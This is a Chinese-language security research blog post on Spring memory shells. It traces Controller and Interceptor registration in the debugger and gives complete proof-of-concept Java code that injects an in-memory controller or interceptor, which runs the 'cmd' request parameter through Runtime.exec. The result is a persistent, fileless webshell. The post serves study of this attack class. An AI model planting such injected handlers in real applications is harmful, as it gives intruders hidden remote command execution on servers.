---
title: Java 内存马第三篇 - Spring 内存马
date: 2025-11-08T15:02:00+08:00
tags:
  - "java安全"
  - "内存马"
categories:
  - "Java安全"
description: Java 内存马第三篇 - Spring 内存马
showToc: true
draft: false
tocOpen: true
---
# Java 内存马第三篇 - Spring 内存马



# 三、Spring 内存马

## 1、Controller 内存马

### 一些基础知识：

#### Bean

`Bean` 是 Spring 框架的一个**核心概念**，它是构成应用程序的主干，并且是由 `Spring IoC` 容器负责实例化、配置、组装和管理的对象。

- bean 是对象
- bean 被 IoC 容器管理
- Spring 应用主要是由一个个的 bean 构成的

#### IOC容器

如果一个系统有大量的组件（类），其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。解决这一问题的核心方案就是IoC（又称为依赖注入）。由IoC负责创建组件、根据依赖关系组装组件、按依赖顺序正确销毁组件。

IOC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用`xml`、`Java注解`或`Java代码`来表示。

#### ApplicationContext

Spring 框架中，`BeanFactory` 接口是 `Spring` **IoC容器** 的实际代表者

Spring容器就是ApplicationContext，它是一个接口继承于BeanFactory，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。我们可以从ApplicationContext中可以根据Bean的ID获取Bean。

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518532.png)

因此，`org.springframework.context.ApplicationContext`接口也代表了 `IoC容器` ，它负责实例化、定位、配置应用程序中的对象(`bean`)及建立这些对象间(`beans`)的依赖。

### 1.1 Controller 创建



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519388.png)



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519690.png)





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519797.png)



SpringController.java

```java
package com.src.springmem.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class SpringController {

    @ResponseBody
    @RequestMapping("/hello")
    public String sayHello(){
        return "hello world";
    }
}
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518537.png)



### 1.2 Controller 注册流程



之前学习的 servlet、filter、listener 等都是通过访问特定路由来访问上传的内存马，那么在 Spring 中直观体现路由逻辑的就是 Controller。

**核心请求链路:**

当访问 `http://127.0.0.1:8098/hello` 时，请求经过以下关键步骤：

1. Servlet 容器层：请求先经过 Tomcat 内置容器的 Filter 链（如 `WsFilter`、`RequestContextFilter`）
2. Spring MVC 入口：进入 `DispatcherServlet`（Spring MVC 核心前端控制器）
3. 请求分发：`DispatcherServlet.doDispatch()` 方法负责请求分发，核心逻辑是「找到匹配的 Controller 方法」
4. Handler 映射：通过 `getHandler()` 方法遍历 `handlerMappings` 列表，找到能处理 `/index` 路径的映射器
5. 方法执行：调用匹配的 Controller 方法（`MyController.index()`），返回响应结果







断点调试，分析 Controller 的注册流程



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518563.png)



`doDispatch` 函数通常出现在基于 Spring MVC 框架的 Java Web 应用程序中，它是 `DispatcherServlet` 类的一个方法。`DispatcherServlet` 是 Spring MVC 中的核心控制器（前端控制器），负责接收所有的 HTTP 请求，并根据请求映射（通常是通过注解或 XML 配置）来决定应该调用哪个控制器（Controller）来处理这个请求。
具体来说，`doDispatch` 方法的主要职责包括：

1. **解析请求**：从传入的 HTTP 请求中提取必要的信息，比如请求路径、请求方法等。
2. **查找处理器**：使用处理器映射（HandlerMapping）机制来找到能够处理当前请求的处理器对象（即 Controller 中的方法）。这一步骤涉及将 URL 路径与已注册的处理器进行匹配。
3. **创建处理器适配器**：一旦找到了合适的处理器，就会通过处理器适配器（HandlerAdapter）来调用该处理器。处理器适配器负责执行具体的控制逻辑，并返回一个模型视图对象（ModelAndView）。
4. **渲染响应**：基于处理器返回的模型视图对象，选择合适的视图解析器（ViewResolver）来生成最终的响应内容。这可能涉及到从数据库获取数据、调用业务逻辑服务等操作。
5. **处理异常**：如果在上述过程中发生任何异常，`doDispatch` 也会负责捕获这些异常并通过适当的异常解析器（ExceptionResolver）来处理它们，确保应用程序能够优雅地应对错误情况并给客户端返回有意义的信息。

总之，`doDispatch` 在 Spring MVC 的工作流程中扮演了极其重要的角色，它协调了从接收到请求到产生响应的整个过程，是实现松耦合且可扩展Web应用的关键部分之一。

我们从 doDispatch 开始看



访问 /hello 路由时，首先要进入到 getHandler()

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518762.png)



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519846.png)



getHandler() 中有一个 HandlerMappings，HandlerMappings 中存在 5 个HandlerMapping ,

通过这五个来确定当前请求的处理程序

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518317.png)



//Determine handler adapter for the current request.	确定当前请求的处理程序适配器。

HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());



通过 `HandlerMapping` 找到 `Handler`，`**getHandlerAdapter(mappedHandler.getHandler())**` **：根据找到的**`**Handler**`**的类型，找到能处理它的** `**HandlerAdapter**`**。**

在这一过程中，选择了适配器进行处理

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519676.png)

继续往下，这一步时实际处理 handler 的

//Actually invoke the handler.

mv = ha.handle(processedRequest, response, mappedHandler.getHandler());

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519550.png)





**现在需要返回到 mappedHandler = getHandler(processedRequest);**  
在这一步中，会进入 getHandler() 

​	

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518045.png)



最终会来到： getHandlerInternal() 方法

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518054.png)



而其中的 mappingRegistry 中存放着我们的路由信息

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519356.png)



这里首先对`mappingRegistry`进行上锁，最后在 finally 块中，进行解锁，



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518642.png)

在 lookupPath 中获取了我们访问的路由	

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518920.png)



**接下来分析一下它的注册流程：**



在 AbstractHandlerMethodMapping.initHandlerMethods 处下断点调试

initHandlerMethods 方法扫描 ApplicationContext 中的 bean，检测和注册处理程序方法

使用`processCandidateBean`方法中来处理bean



断点要让他运行直到获得我们需要的 SpringController



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518356.png)



进入 processCandidateBean 方法

首先通过 getType() 获取到了 beanType



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520106.png)



判断该Bean是否为`Handler`对象，如果是的话，就将其传入`detectHandlerMethods`方法中



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518461.png)



getUserClass  获取类名

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520959.png)



获取方法名

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520985.png)



registerHandlerMethod 执行注册操作



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518416.png)

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518826.png)





### 1.3 内存马编写



#### 1.3.1 获取上下文

对于内存马的注入，最重要的事情就是获取上下文，在Tomcat中获取说的上下文为`StandardContext`，对于Spring获取的就是`WebApplicationContext`。



五种方法：

1. ContextLoader
2. WebApplicationContextUtils
3. RequestContextUtils
4. getAttribute
5. 反射获取

##### **ContextLoader**

`getCurrentWebApplicationContext` 获得的是一个 `XmlWebApplicationContext` 实例类型的 `Root WebApplicationContext`。  

```java
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```



##### WebApplicationContextUtils

通过这种方法获得的也是一个 `Root WebApplicationContext`。其中 `WebApplicationContextUtils.getWebApplicationContext` 函数也可以用 `WebApplicationContextUtils.getRequiredWebApplicationContext`来替换。  

```java
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
```



##### **RequestContextUtils**

通过 `ServletRequest` 类的实例来获得 `Child WebApplicationContext`。  

```java
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```



##### **getAttribute**

 这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext  

```java
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```



##### 反射获取

 还可以通过反射获取`LiveBeansView`类的`applicationContexts` 属性来获取上下文。  

```java
// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
// 2. 属性被 private 修饰，所以 setAccessible true
filed.setAccessible(true);
// 3. 获取一个 ApplicationContext 实例
org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
```

`org.springframework.context.support.LiveBeansView` 类在 `spring-context` 3.2.x 版本（现在最新版本是 5.3.x）才加入其中，所以比较低版本的 spring 无法通过此方法获得 `ApplicationContext` 的实例。  

#### 1.3.2 注册 Controller

Spring Controller 的动态注册，就是对 `RequestMappingHandlerMapping` 注入的过程。



Spring 2.5 开始到 Spring 3.1 之前一般使用
`org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping`
映射器 ；

Spring 3.1 开始及以后一般开始使用新的
`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping`映射器来支持@Contoller和@RequestMapping注解。



三种方法：

1. registerMapping
2. registerHandler
3. detectHandlerMethods





##### registerMapping

 在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping  

```java
// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
Method method = (Class.forName("me.landgrey.SSOLogin").getDeclaredMethods())[0];
// 3. 定义访问 controller 的 URL 地址
PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");
// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
// 5. 在内存中动态注册 controller
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
r.registerMapping(info, Class.forName("恶意Controller").newInstance(), method);
```



##### registerHandler

参考上面的 `HandlerMapping` 接口继承关系图，针对使用 `DefaultAnnotationHandlerMapping` 映射器的应用，可以找到它继承的顶层类`org.springframework.web.servlet.handler.AbstractUrlHandlerMapping`

在其`registerHandler()`方法中

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518808.png)

 该方法接受 `urlPath`参数和 `handler`参数，可以在 `this.getApplicationContext()` 获得的上下文环境中寻找名字为 `handler` 参数值的 `bean`, 将 url 和 controller 实例 bean 注册到 `handlerMap` 中  

```java
// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
// 3. 反射获得 registerHandler Method
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);
m1.setAccessible(true);
// 4. 将 dynamicController 和 URL 注册到 handlerMap 中
m1.invoke(dh, "/favicon", "dynamicController");
```





##### detectHandlerMethods



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518516.png)



 该方法仅接受`handler`参数，同样可以在 `this.getApplicationContext()` 获得的上下文环境中寻找名字为 `handler` 参数值的 `bean`, 并注册 `controller` 的实例 `bean`



```java
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("恶意Controller").newInstance());
org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
m1.setAccessible(true);
m1.invoke(requestMappingHandlerMapping, "dynamicController");
```





#### 1.3.3 实现恶意 Controller



```java
package com.src.springmem.demos.web;


import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

public class ControllerShell {
    public ControllerShell() {}

    public void shell() throws IOException {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
}
```





#### 1.3.4 完整 POC



POC 并不唯一，想要复现成功取决于自己的**运行环境**，比如 spring boot 版本问题等，**具体问题具体分析！**



```java
package com.src.springmem.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Method;

@Controller
public class shell_controller {

    //    @ResponseBody
    @RequestMapping("/control")
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {

        //获取当前上下文环境
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        //手动注册Controller
        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method = Controller_Shell.class.getDeclaredMethod("shell");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        r.registerMapping(info, new Controller_Shell(), method);

    }

    public class Controller_Shell{

        public Controller_Shell(){}

        public void shell() throws IOException {

            //获取request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        }
    }

}
```



先访问 /control 进行 controller 注册，然后访问 controller 映射路径 /shell，加上参数就可以实现 RCE

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518492.png)	![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518947.png)



#### 记录问题：



环境：

Spring Boot    v2.6.13

Spring Framework v5.3.23

Tomcat 9.0.68

JDK 1.8.0_65



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518183.png)



 **- 核心错误：**（借用 AI 解决）

**java.lang.IllegalArgumentException: Expected lookupPath in request attribute "org.springframework.web.util.UrlPathHelper.PATH".**

​	at org.springframework.util.Assert.notNull(Assert.java:201) ~[spring-core-5.3.23.jar:5.3.23]

​	at org.springframework.web.util.UrlPathHelper.getResolvedLookupPath(UrlPathHelper.java:213) ~[spring-web-5.3.23.jar:5.3.23]

Spring MVC 在匹配请求路径时，从 `request` 中没有找到名为 `"org.springframework.web.util.UrlPathHelper.PATH"` 的属性。

这是 **Spring 5.3.x** 与 **Tomcat 9 / Servlet 4** 之间在请求路径解析机制上的一个兼容性问题。



**出现原因：**

### Spring Boot 版本问题

使用的是：

Spring Boot 2.6.13

Spring Framework 5.3.23

Tomcat 9.0.68

这一代中，Spring MVC 的路径解析默认切换到了 **PathPatternParser**，而部分组件仍然依赖旧的 `UrlPathHelper`。

如果你项目中混用了旧式的 `@RequestMappingHandlerMapping` 或自定义 `HandlerMapping`，也可能触发这个问题。

### Spring 配置不兼容（可能加了某些配置类）

从 Spring Boot 2.6 开始：

- 默认路径匹配策略从 `AntPathMatcher` 改成了 `PathPatternParser`；
- 某些旧代码（或自定义 Controller 注册逻辑）没适配这个新规则。



**解决方法：**

在 `application.properties` 或 `application.yml` 加上：

```plain
spring.mvc.pathmatch.matching-strategy=ant_path_matcher
```

意思：强制使用旧版的路径解析机制（与 Spring 2.5 以前版本兼容）。

适用于目前使用的 Spring Boot 2.6.x。



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520466.png)



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518085.png)





## 2、Interceptor 内存马



### 什么是Interceptor

Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。

在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。

- 通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义
- 通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义



**Interceptor和Tomcat和Filter过滤器很类似。**

区别如下：

1. Interceptor基于反射，Filter基于函数回调
2. Interceptor不依赖servlet容器
3. Interceptor只能对action请求有用
4. Interceptor可以访问action上下文，栈里的对象。Filter不能
5. action生命周期中，Interceptor可以被多次调用，Filter只在容器初始化时调用一次
6. Interceptor可以获取IOC容器中的bean，Filter不行

由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作



### 2.1 Interceptor 创建



```java
package com.src.springmem.demos.interceptor;

import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;

public class LoginInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String url = String.valueOf(request.getRequestURL());
        PrintWriter writer = response.getWriter();

        if(url.indexOf("/login")>= 0 ){
            writer.write("LoginIn");
            writer.flush();
            writer.close();
            return true;
        }
        writer.write("LoginInFirst");
        writer.flush();
        writer.close();
        return false;
    }
}
```



```java
package com.src.springmem.demos.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class LoginController {
    @GetMapping("/login")
    public String login() {
        return "Login Page";
    }

    @GetMapping("/data")
    public String data() {
        return "Protected Data";
    }
}
```



```java
package com.src.springmem.demos.config;

import com.src.springmem.demos.interceptor.LoginInterceptor;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new LoginInterceptor())
                .addPathPatterns("/**")           // 拦截所有路径
                .excludePathPatterns("/login");   // 放行登录接口
    }
}
```





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520006.png)



访问可通行的路径：



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518686.png)	![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518278.png)



### 2.2 Interceptor 流程分析



还是在 DispatcherServlet.doDispatch 处下断点调试



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518820.png)



步入 getHandler()

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521460.png)

继续跟进，来到一个方法：getHandlerExecutionChain

该方法从 adaptedInterceptors 中把符合的拦截器添加到 chain 里，





![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518126.png)



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518756.png)



最后把结果返回到 doDispatch

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521545.png)



在 doDispath  中执行 applyPreHandle 遍历执行了拦截器。

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518383.png)





 其他师傅给出了 Filter,controller,Interceptors执行的顺序：

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518441.png)

- preHandle( )：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。
- postHandle( )：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。
- afterCompletion( )：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。





### 2.3 注册 Interceptor 

#### 2.3.1 获取上下文

参考 Controller 的获取上下文方式



这里使用反射获取

```java
// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
// 2. 属性被 private 修饰，所以 setAccessible true
filed.setAccessible(true);
// 3. 获取一个 ApplicationContext 实例
org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
```

#### 2.3.2 获取adaptedInterceptors属性值

 获得 `ApplicationContext` 实例后，还需要知道 `org.springframework.web.servlet.handler.AbstractHandlerMapping` 类实例的 bean name 叫什么。  

 我们可以通过`ApplicationContext`上下文来获取`AbstractHandlerMapping`，进而反射获取`adaptedInterceptors`属性值  	

```java
org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
field.setAccessible(true);
java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
```



#### 2.3.3 恶意 Interceptor



```java
package com.shell.interceptor;
 
import org.springframework.web.servlet.HandlerInterceptor;
 
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
 
public class ShellInterceptor implements HandlerInterceptor {
 
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
            return true;
        }
        return false;
    }
}
```







#### 2.3.4 动态注册Interceptor

我们知道Spring是通过遍历adaptedInterceptors属性值来执行Interceptor的，因此最后我们只需要将恶意Interceptor加入到 `adaptedInterceptors` 属性值中就可以了。



```java
//将恶意Interceptor添加入adaptedInterceptors
ShellInterceptor shell_interceptor = new ShellInterceptor();
adaptedInterceptors.add(shell_interceptor);
```





#### 2.3.5 完整 POC 

```java
package com.src.springmem.demos.controller;


import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@Controller
public class shell_interceptor_controller {

    @ResponseBody
    @RequestMapping("/inject")
    public void Inject() throws Exception {
        //获取上下文环境
        java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
        filed.setAccessible(true);
        org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet) filed.get(null)).iterator().next();

        //获取adaptedInterceptors属性值
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean("requestMappingHandlerMapping");
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);

        //将恶意 Interceptor添加入 adaptedInterceptors
        ShellInterceptor shellInterceptor = new ShellInterceptor();
        adaptedInterceptors.add(shellInterceptor);
    }

    public class ShellInterceptor implements HandlerInterceptor {

        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
                return true;
            }
            return false;
        }
    }
}
```



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518658.png)



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518094.png)



![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521076.png)	

# 参考：

[【原创】利用“进程注入”实现无文件不死webshell](https://www.cnblogs.com/rebeyond/p/9686213.html)


[Java安全学习——内存马 - 枫のBlog](https://goodapple.top/archives/1355)

[Spring内存马 | CurlySean’s Blog](http://101.36.122.13:4000/2025/08/06/Spring内存马/#J9TFY)



[Java Agent实现反序列化注入内存shell](https://y4er.com/posts/javaagent-tomcat-memshell/#简述内存shell)

[JavaWeb 内存马一周目通关攻略 | 素十八](https://su18.org/post/memory-shell/)

[JavaWeb 内存马二周目通关攻略 | 素十八](https://su18.org/post/memory-shell-2/)

[Shell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com](https://www.4hou.com/posts/zlkq)

[Java内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/433972.html)

[Java 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客](https://hilang.cloud/java-内存马（四）：spring-boot-controller-内存马/)

[Spring型内存马分析](https://stoocea.github.io/post/Spring型内存马分析.html#2-Controller-型内存马)

[Servlet 简介 | 菜鸟教程](https://www.runoob.com/servlet/servlet-intro.html)

[Spring内存马学习](https://clowsman.github.io/2024/11/13/Spring内存马学习/index.html)

[Spring内存马——Controller/Interceptor构造](https://xz.aliyun.com/news/11493)

[基础篇 - Javassist 使用指南](https://changeyourway.github.io/2024/06/07/Java 安全/基础篇-javassist用法指南/)

[Java安全学习——ROME反序列化 - 枫のBlog](https://goodapple.top/archives/1145#header-id-20) （使用Javassist缩短恶意class）

[Java Agent实现反序列化注入内存shell](https://y4er.com/posts/javaagent-tomcat-memshell/)

[Agent内存马 | CurlySean’s Blog](http://101.36.122.13:4000/2025/08/05/JavaAgent内存马)